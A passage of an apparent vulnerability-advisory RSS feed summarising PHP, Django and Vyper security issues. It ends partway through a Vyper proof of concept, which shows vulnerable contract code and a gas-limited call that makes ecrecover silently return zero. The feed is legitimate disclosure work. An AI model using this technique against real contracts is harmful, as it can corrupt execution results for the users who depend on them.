                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.30, 8.2.* before 8.2.24, 8.3.* before 8.3.12, erroneous parsing of multipart form data contained in an HTTP POST request could lead to legitimate data not being processed. This could lead to malicious attacker able to control part of the submitted data being able to exclude portion of other data, potentially leading to erroneous application behavior.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-8927: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-8927</link>
                    <pubDate>2025-01-14T19:19:01.003Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-8927'>https://osv.dev/vulnerability/BIT-php-min-2024-8927</a><br>
                            <b>Published:</b> 2025-01-14T19:19:01.003Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-94p6-54jq-9mwp'>https://github.com/php/php-src/security/advisories/GHSA-94p6-54jq-9mwp</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.30, 8.2.* before 8.2.24, 8.3.* before 8.3.12, HTTP_REDIRECT_STATUS variable is used to check whether or not CGI binary is being run by the HTTP server. However, in certain scenarios, the content of this variable can be controlled by the request submitter via HTTP headers, which can lead to cgi.force_redirect option not being correctly applied. In certain configurations this may lead to arbitrary file inclusion in PHP.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-8929: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-8929</link>
                    <pubDate>2025-01-14T19:18:54.420Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-8929'>https://osv.dev/vulnerability/BIT-php-min-2024-8929</a><br>
                            <b>Published:</b> 2025-01-14T19:18:54.420Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-h35g-vwh6-m678'>https://github.com/php/php-src/security/advisories/GHSA-h35g-vwh6-m678</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20250110-0008/'>https://security.netapp.com/advisory/ntap-20250110-0008/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.31, 8.2.* before 8.2.26, 8.3.* before 8.3.14, a hostile MySQL server can cause the client to disclose the content of its heap containing data from other SQL requests and possible other data belonging to different users of the same server.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-8932: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-8932</link>
                    <pubDate>2025-01-14T19:18:48.396Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-8932'>https://osv.dev/vulnerability/BIT-php-min-2024-8932</a><br>
                            <b>Published:</b> 2025-01-14T19:18:48.396Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-g665-fm4p-vhff'>https://github.com/php/php-src/security/advisories/GHSA-g665-fm4p-vhff</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20250110-0009/'>https://security.netapp.com/advisory/ntap-20250110-0009/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.31, 8.2.* before 8.2.26, 8.3.* before 8.3.14, uncontrolled long string inputs to ldap_escape() function on 32-bit systems can cause an integer overflow, resulting in an out-of-bounds write.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-9026: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-9026</link>
                    <pubDate>2025-01-14T19:18:42.298Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-9026'>https://osv.dev/vulnerability/BIT-php-min-2024-9026</a><br>
                            <b>Published:</b> 2025-01-14T19:18:42.298Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-865w-9rf3-2wh5'>https://github.com/php/php-src/security/advisories/GHSA-865w-9rf3-2wh5</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.30, 8.2.* before 8.2.24, 8.3.* before 8.3.12, when using PHP-FPM SAPI and it is configured to catch workers output through catch_workers_output = yes, it may be possible to pollute the final log or remove up to 4 characters from the log messages by manipulating log message content. Additionally, if PHP-FPM is configured to use syslog output, it may be possible to further remove log data using the same vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>PYSEC-2025-1: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#PYSEC-2025-1</link>
                    <pubDate>2025-01-14T19:15:32Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/PYSEC-2025-1'>https://osv.dev/vulnerability/PYSEC-2025-1</a><br>
                            <b>Published:</b> 2025-01-14T19:15:32Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://www.djangoproject.com/weblog/2025/jan/14/security-releases/'>https://www.djangoproject.com/weblog/2025/jan/14/security-releases/</a></li><li>- <a target='_blank' href='https://docs.djangoproject.com/en/dev/releases/security/'>https://docs.djangoproject.com/en/dev/releases/security/</a></li><li>- <a target='_blank' href='https://groups.google.com/g/django-announce'>https://groups.google.com/g/django-announce</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2025/01/14/2'>http://www.openwall.com/lists/oss-security/2025/01/14/2</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in Django 5.1 before 5.1.5, 5.0 before 5.0.11, and 4.2 before 4.2.18. Lack of upper-bound limit enforcement in strings passed when performing IPv6 validation could lead to a potential denial-of-service attack. The undocumented and private functions clean_ipv6_address and is_valid_ipv6_address are vulnerable, as is the django.forms.GenericIPAddressField form field. (The django.db.models.GenericIPAddressField model field is not affected.)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vgf2-gvx8-xwc3: 2.3 | <b>Vyper Does Not Check the Success of Certain Precompile Calls</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vgf2-gvx8-xwc3</link>
                    <pubDate>2025-01-14T16:34:20Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vgf2-gvx8-xwc3'>https://osv.dev/vulnerability/GHSA-vgf2-gvx8-xwc3</a><br>
                            <b>Published:</b> 2025-01-14T16:34:20Z<br>
                            <b>Severity:</b> 2.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vyperlang/vyper/security/advisories/GHSA-vgf2-gvx8-xwc3'>https://github.com/vyperlang/vyper/security/advisories/GHSA-vgf2-gvx8-xwc3</a></li><li>- <a target='_blank' href='https://github.com/vyperlang/vyper'>https://github.com/vyperlang/vyper</a></li></ul><br>
                            <b>Details:</b> <b>Vyper Does Not Check the Success of Certain Precompile Calls</b><br>### Summary

When the Vyper Compiler uses the precompiles EcRecover (0x1) and Identity (0x4), the success flag of the call is not checked. As a consequence an attacker can provide a specific amount of gas to make these calls fail but let the overall execution continue. Then the execution result can be incorrect.

Based on EVM&#x27;s rules, after the failed precompile the remaining code has only 1&#x2F;64 of the pre-call-gas left (as 63&#x2F;64 were forwarded and spent). Hence, only fairly simple executions can follow the failed precompile calls. Therefore, we found no significantly impacted real-world contracts.

The fix is tracked in https:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;pull&#x2F;4451.

### Details


#### The relevant precompiles

##### EcRecover

EcRecover is used in vyper&#x27;s `ecrecover` built-in. As the precompile consumes 3000 gas, any execution after an out-of-gas EcRecover call has at most 47 gas left.

##### Identity

- The Identity precompile is used in vyper to perform memory copy operations. As its cost is variable, a variable amount of gas might be left after a failed call. The bigger the copy operation, the more gas can be left. Hence, a failed call to Identity could theoretically be followed by successful storage changes or emitted events.
- Identity is no longer used when `evm-version` `cancun` is used (because `MCOPY` is used instead). In 0.4.0 `cancun` is default, in 0.3.10 `cancun` is an option, otherwise `cancun` is not available. As only pre-`cancun` versions are relevant, we don&#x27;t have to consider transient storage operations succeeding a failed call to Identity.

#### The other precompiles

- Calls to `Sha2`, `ecAdd`, and `ecMul` have success checks and have had them for a long time.
- The precompiles `modexp`, `ripe`, `blake`, `ecPairing`, and `Point Evaluation` have no builtins in vyper.


### PoC

In the following we provide concrete examples of incorrectly generated bytecode. These examples are not optimized, but rather Proof-of-Concepts. The list is also not exhaustive.

#### `ecrecover` use

- Affected versions: 0.2.0 - 0.4.0 
- For older compiler versions (&amp;lt;=0.3.9) it behaves similarly to this [older advisory](https:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;security&#x2F;advisories&#x2F;GHSA-f5x6-7qgp-jhf3). As no data is returned, the previous value of the memory word is returned to the user. Hence, any dirty bytes might be returned. Contracts with older compiler versions and `ecrecover` were checked.
- For new vyper versions, the output buffer is zeroed, so when the call fails zero is returned. This is an incorrect result, but developers should anyway check for 0 as a failure case. Hence, this is unlikely to result in issues. However, we did search for such cases.
- As mentioned above at most 47 gas is left after the failed call, hence a `return` is the most realistic scenario to be attacked.

Vulnerable Code:
```py
@external
@view
def foo(hash: bytes32, v: uint256, r:uint256, s:uint256) -&amp;gt; address:
    return ecrecover(hash, v, r, s)
```

Problematic Call:
```py
print(
    c.foo(
        binascii.unhexlify(
            &quot;6c9c5e133b8aafb2ea74f524a5263495e7ae5701c7248805f7b511d973dc7055&quot;
        ),
        28,
        78616903610408968922803823221221116251138855211764625814919875002740131251724,
        37668412420813231458864536126575229553064045345107737433087067088194345044408,
    )
)  # Returns 0x9eE53ad38Bb67d745223a4257D7d48cE973FeB7A

print(
    c.foo(
        binascii.unhexlify(
            &quot;6c9c5e133b8aafb2ea74f524a5263495e7ae5701c7248805f7b511d973dc7055&quot;
        ),
        28,
        78616903610408968922803823221221116251138855211764625814919875002740131251724,
        37668412420813231458864536126575229553064045345107737433087067088194345044408,
        gas=3000,
    )
)  # Returns 0x0000000000000000000000000000000000000000
```

#### Identity to copy Dynamic Arrays

- Affected versions: 0.3.2 - 0.3.9
- Dynamic Arrays might be copied on different occasions
- That copy operation can fail leading to incorrect accesses afterwards

Vulnerable Code:
```py

@external
def foo() -&amp;gt; uint256:
    a: DynArray[uint256, 4000] = [2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 